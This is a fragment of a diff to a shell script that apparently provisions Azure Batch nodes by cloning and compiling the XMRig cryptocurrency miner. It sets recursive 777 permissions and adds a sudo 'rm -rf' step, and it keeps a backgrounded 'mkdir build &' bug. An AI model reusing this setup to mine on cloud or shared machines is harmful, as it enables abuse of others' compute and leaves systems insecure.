@@ -27,10 +27,11 @@ else
     sleep 2 &&
     sudo chmod -R 777 /home/_azbatch &&
     cd /home/_azbatch &&
+    sudo rm -rf xmrig &&
     git clone https://github.com/xmrig/xmrig.git && 
     sleep 2 &&
     cd /home/_azbatch/xmrig &&
-    git checkout v6.12.1 & sleep 2 &&
+    git checkout v6.12.1 &&
     mkdir build &
     cd /home/_azbatch/xmrig/build &&
     cmake .. && make
